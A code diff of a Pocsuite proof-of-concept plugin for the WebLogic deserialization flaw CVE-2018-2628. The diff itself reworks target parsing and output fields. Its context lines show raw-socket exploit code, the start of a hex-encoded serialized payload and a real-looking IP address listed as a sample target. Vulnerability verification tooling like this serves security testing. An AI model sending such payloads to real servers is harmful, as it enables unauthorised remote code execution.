@@ -14,7 +14,7 @@ from pocsuite.api.poc import Output, POCBase
 
 class TestPOC(POCBase):
     vulID = '00003'
-    version = '1.0'
+    version = '1'
     author = 'TideSec'
     vulDate = '2018-04-19'
     createDate = '2018-04-20'
@@ -28,23 +28,7 @@ class TestPOC(POCBase):
     desc = '高危的Weblogic反序列化漏洞(CVE-2018-2628) 通过该漏洞 攻击者可以在未授权的情况下远程执行代码'
     samples = ['103.54.173.29:9000']
     defaultPorts = [7001]
-    defaultService = ['WebLogic', 'weblogic', 'afs3-callback', 'afs3-callback?']
-
-    def parse_target(self, target, default_port):
-        schema = 'http'
-        port = default_port
-        address = ''
-        if '://' in target:
-            slices = target.split('://')
-            schema = slices[0]
-            target = slices[1]
-        if ':' in target:
-            slices = target.split(':')
-            address = slices[0]
-            port = slices[1]
-        else:
-            address = target
-        return {'schema': schema, 'address': address, 'port': int(port)}
+    defaultService = ['WebLogic', 'weblogic', 'afs3-callback']
 
     def _verify(self):
         def _handshake(s_socket, target_add):
@@ -102,9 +86,8 @@ class TestPOC(POCBase):
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         socket.setdefaulttimeout(4)
-        target = self.parse_target(self.target, 7001)
-        target_ip = target['address']
-        target_port = target['port']
+        target_ip = self.url.split(':')[1].strip("/")
+        target_port = int(self.url.split(':')[2].strip("/"))
         target = (target_ip, target_port)
 
         payload_data1 = ("000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2"
@@ -156,9 +139,9 @@ class TestPOC(POCBase):
                     re_result = re.findall('\\$Proxy[0-9]+', respond, re.S)
                     if len(re_result) > 0:
                         result['VerifyInfo'] = {}
-                        result['VerifyInfo']['URL'] = "{}:{}".format(target_ip, target_port)
-                        result['VerifyInfo']['Payload'] = payload
-                        result['VerifyInfo']['Result'] = re_result
+                        result['VerifyInfo']['url'] = target_ip
+                        result['VerifyInfo']['port'] = target_port
+                        result['VerifyInfo']['result'] = re_result
             except Exception as e:
                 print(e)
                 pass
